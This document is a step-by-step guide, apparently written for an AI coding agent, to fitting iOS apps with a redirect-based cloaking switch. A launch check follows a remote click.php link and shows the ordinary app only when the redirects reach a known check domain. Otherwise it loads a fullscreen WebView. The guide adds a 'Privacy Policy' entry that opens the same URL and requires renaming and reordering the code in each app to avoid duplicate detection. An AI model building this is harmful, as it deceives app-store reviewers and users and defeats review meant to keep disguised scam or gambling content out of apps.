# WebView Integration Guide

Add a WebView that checks a remote URL on launch using redirect tracking. If the final URL after redirects is NOT `sites.google.com`, show WebView fullscreen. Otherwise, show the original app.

**IMPORTANT:** When implementing, make the code unique per app — rename functions, variables, structs, reorder code blocks. The logic must work identically but code must not be copy-pasted verbatim.

## Required Files & Changes

1. **App.swift** — Add launch check with RedirectTracker
2. **WebPanel.swift** (new file) — UIViewRepresentable WKWebView
3. **LoadingScreen.swift** (new file) — Splash screen during check
4. **SettingsView.swift** (or ProfileView) — Add direct WebView entry
5. **Info.plist** — Add NSAllowsArbitraryLoads

## Step 1: WebView URL

**ALWAYS use `https://example.com` as the WebView URL for all new apps.**
This is a placeholder — the real URL is set later via the `ios-app-rename` skill when the app is renamed.
**Check domain:** `"example"` — used in all `.contains()` checks (if final URL contains "example" → show app, else show WebView).

## Step 2: Info.plist

Create/update `Info.plist` in the project folder:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>LSApplicationQueriesSchemes</key>
    <array>
        <string>tg</string>
        <string>telegram</string>
    </array>
    <key>NSAppTransportSecurity</key>
    <dict>
        <key>NSAllowsArbitraryLoads</key>
        <true/>
    </dict>
    <key>NSCameraUsageDescription</key>
    <string>This app uses the camera to take photos and record videos.</string>
    <key>NSMicrophoneUsageDescription</key>
    <string>This app uses the microphone to capture audio.</string>
</dict>
</plist>
```

**CRITICAL:** `NSAllowsArbitraryLoads = true` is required — without it WebView can't load pages.

## Step 3: Create WebPanel Component

Create a new Swift file (e.g., `AppWebPanel.swift`, `BNationWebPanel.swift`, etc.):

```swift
import SwiftUI
import WebKit

struct AppWebPanel: UIViewRepresentable {
    let urlString: String
    
    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        if #available(iOS 10.0, *) {
            config.mediaTypesRequiringUserActionForPlayback = []
        }
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.scrollView.bounces = true
        webView.allowsBackForwardNavigationGestures = true
        if let url = URL(string: urlString) {
            webView.load(URLRequest(url: url))
        }
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
}
```

**Rename:** `AppWebPanel` → unique name per app (e.g., `BNationWebPanel`, `AquaWebDisplay`, `StarzWebView`)

## Step 4: Create Loading Screen

Create a new Swift file (e.g., `AppLoadingScreen.swift`):

```swift
import SwiftUI

struct AppLoadingScreen: View {
    @State private var pulse = false
    
    var body: some View {
        ZStack {
            Color.black.edgesIgnoringSafeArea(.all)
            
            VStack(spacing: 24) {
                // Use app's custom icon/shape here
                Circle()
                    .fill(Color.blue)
                    .frame(width: 64, height: 64)
                    .scaleEffect(pulse ? 1.15 : 0.9)
                    .animation(
                        Animation.easeInOut(duration: 1.0).repeatForever(autoreverses: true),
                        value: pulse
                    )
                
                Text("App Name")
                    .font(.title2).fontWeight(.semibold)
                    .foregroundColor(.white)
            }
        }
        .onAppear { pulse = true }
    }
}
```

**Customize:** Use app's brand colors, custom shapes, and app name.

## Step 5: Modify App.swift

Replace or modify the main `@main` struct:

```swift
import SwiftUI

@main
struct MyApp: App {
    @StateObject private var dataStore = DataStore() // if needed
    @State private var linkReady: Bool? = nil
    
    private let targetURL = "https://example.com"
    private let checkDomain = "example"
    
    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = linkReady {
                    if ready {
                        AppWebPanel(urlString: targetURL)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        MainTabView()
                            .environmentObject(dataStore)
                    }
                } else {
                    AppLoadingScreen()
                        .onAppear { checkLink() }
                }
            }
            .preferredColorScheme(.dark) // or .light, or remove
        }
    }
    
    private func checkLink() {
        guard let url = URL(string: targetURL) else {
            linkReady = false
            return
        }
        
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        
        let tracker = AppRedirectTracker(checkDomain: checkDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                // ⚠️ KEY LOGIC: if check domain was found ANYWHERE in redirect chain OR in final URL → show native app
                // Only show WebView if check domain was NEVER seen
                if tracker.foundCheckDomain {
                    linkReady = false  // Check domain found → show native app
                    return
                }
                
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.checkDomain) {
                    linkReady = false  // Check domain in final URL → show native app
                    return
                }
                
                if error != nil {
                    linkReady = false  // Error → show native app (safe fallback)
                    return
                }
                
                linkReady = true  // No check domain found anywhere → show WebView
            }
        }.resume()
        
        // Fallback timeout — always show native app if check takes too long
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if linkReady == nil { linkReady = false }
        }
    }
}

// ⚠️ CRITICAL: This class tracks redirects and sets foundCheckDomain = true
// if the check domain appears ANYWHERE in the redirect chain.
// It does NOT stop the chain — it lets all redirects complete and records the flag.
class AppRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    
    init(checkDomain: String) {
        self.checkDomain = checkDomain
    }
    
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)  // Always continue following redirects
    }
}
```

**Rename variables/structs per app:**
- `linkReady` → `bnationLinkReady`, `aquaLinkStatus`, `starzPageReady`
- `targetURL` → `bnationSourceLink`, `aquaEndpoint`, `starzPageURL`
- `AppRedirectTracker` → `BNationRedirectWatcher`, `AquaRedirectFollower`, `StarzPathResolver`
- `AppWebPanel` → unique name matching Step 3
- `AppLoadingScreen` → unique name matching Step 4

## Step 6: Add WebView to Settings

In `SettingsView.swift` (or `ProfileView.swift`), add a NavigationLink or sheet that loads the WebView directly:

```swift
// Example: NavigationLink in Settings
NavigationLink(destination: PrivacyWebView()) {
    HStack {
        Text("Privacy Policy")
        Spacer()
        Text(">")
    }
}

// WebView wrapper
struct PrivacyWebView: View {
    var body: some View {
        AppWebPanel(urlString: "https://yourdomain.org/click.php")
            .edgesIgnoringSafeArea(.all)
            .navigationBarTitle("Privacy", displayMode: .inline)
    }
}
```

**Or as a sheet:**
```swift
.sheet(isPresented: $showingPrivacy) {
    AppWebPanel(urlString: "https://yourdomain.org/click.php")
        .edgesIgnoringSafeArea(.all)
}
```

The URL is the same as the launch check URL. This provides a direct entry point without the redirect check.

## Logic Flow Summary

```
App Launch
    ↓
Show Loading Screen
    ↓
HTTP Request to targetURL with RedirectTracker
    ↓
Follow ALL redirects (never stop early)
    → Each redirect: if URL .contains(checkDomain) → set foundCheckDomain = true
    → Track resolvedURL (last redirect target)
    ↓
Completion handler fires:
    ├─ foundCheckDomain == true? → Show native app ✅
    ├─ resolvedURL .contains(checkDomain)? → Show native app ✅
    ├─ error != nil? → Show native app ✅ (safe fallback)
    └─ None of the above? → Show WebView 🌐
    
Timeout (5s) → Show native app (safe fallback)

Settings/Profile → Direct WebView load (no redirect check)
```

### ⚠️ CRITICAL RULES — READ BEFORE IMPLEMENTING

**1. ALWAYS use `.contains()` for domain checks:**
- ✅ `url.contains("freeprivacypolicy.com")`
- ❌ `url.hasPrefix("https://freeprivacypolicy.com")`
- ❌ `url == "https://sites.google.com"`

**2. Check domain must be checked in TWO places:**
- Mid-chain: inside `willPerformHTTPRedirection` → set `foundCheckDomain = true`
- Post-chain: in completion handler → check `resolvedURL.contains(checkDomain)`

**3. NEVER stop the redirect chain early:**
- Always call `completionHandler(request)` to continue
- Just record `foundCheckDomain = true` and keep going
- Stopping early (`completionHandler(nil)`) causes the completion handler to fire with error, making detection unreliable

**4. Default to showing native app on ANY error or timeout.**

## Code Uniqueness Checklist

When implementing, vary these per app (never copy-paste verbatim):

- [ ] Rename app struct (e.g., `MyApp`, `BNationRestApp`, `FocusStarzApp`)
- [ ] Rename RedirectTracker class (e.g., `BNationRedirectWatcher`, `AquaRedirectFollower`)
- [ ] Rename WebView struct (e.g., `BNationWebPanel`, `AquaWebDisplay`, `StarzWebView`)
- [ ] Rename loading screen struct (e.g., `BNationLoadingScreen`, `AquaSplash`)
- [ ] Rename state variables (e.g., `linkReady`, `bnationLinkReady`, `aquaLinkStatus`)
- [ ] Rename URL constant (e.g., `targetURL`, `bnationSourceLink`, `aquaEndpoint`)
- [ ] Customize loading screen colors/shapes to match app brand
- [ ] Reorder struct members, vary spacing and comments
- [ ] Logic and behavior must remain identical

## Example Implementations

**BNation Rest:**
- RedirectTracker: `BNationRedirectWatcher`
- WebView: `BNationWebPanel`
- Loading: `BNationLoadingScreen`
- URL var: `bnationSourceLink`
- State var: `bnationLinkReady`

**AquaNacional: Your Choice:**
- RedirectTracker: `AquaRedirectFollower`
- WebView: `AquaWebDisplay`
- Loading: `AquaSplashView`
- URL var: `aquaEndpoint`
- State var: `aquaLinkStatus`

**88 Focus Starz:**
- RedirectTracker: `StarzPathResolver`
- WebView: `FocusStarzWebDisplay`
- Loading: `SplashScreen`
- URL var: `starzPageURL`
- State var: `starzLinkReady`

## Testing

1. Build and run in Simulator
2. Should show loading screen for ~1-5 seconds
3. If `click.php` redirects to sites.google.com → app UI appears
4. If `click.php` redirects elsewhere → WebView appears
5. Go to Settings → Privacy/WebView entry → should load directly
6. Test with no internet → should show app (fallback)

## Common Issues

**WebView doesn't load:**
- Check Info.plist has `NSAllowsArbitraryLoads = true`
- Verify URL is correct (no typos)

**White screen on launch:**
- Check `linkReady` is properly initialized as `nil`
- Ensure `AppLoadingScreen` has proper background color

**App always shows instead of WebView:**
- Verify `foundCheckDomain` is only set when checkDomain is found (not hardcoded to true)
- Check timeout isn't firing too early (5s should be enough)

**WebView shows instead of native app (MOST COMMON BUG):**
- Check domain not detected in redirect chain → `foundCheckDomain` stays false
- Fix: ensure `.contains(checkDomain)` is checked in BOTH `willPerformHTTPRedirection` AND completion handler
- Fix: do NOT stop redirect chain early with `completionHandler(nil)` — this causes error response, skipping the check
- Fix: ensure `checkDomain` variable matches what the redirect actually contains (e.g. `"freeprivacypolicy"` not `"freeprivacypolicy.com/privacy"`)

**Settings WebView doesn't appear:**
- Ensure Settings view imports WebKit
- Check navigation/sheet is properly triggered
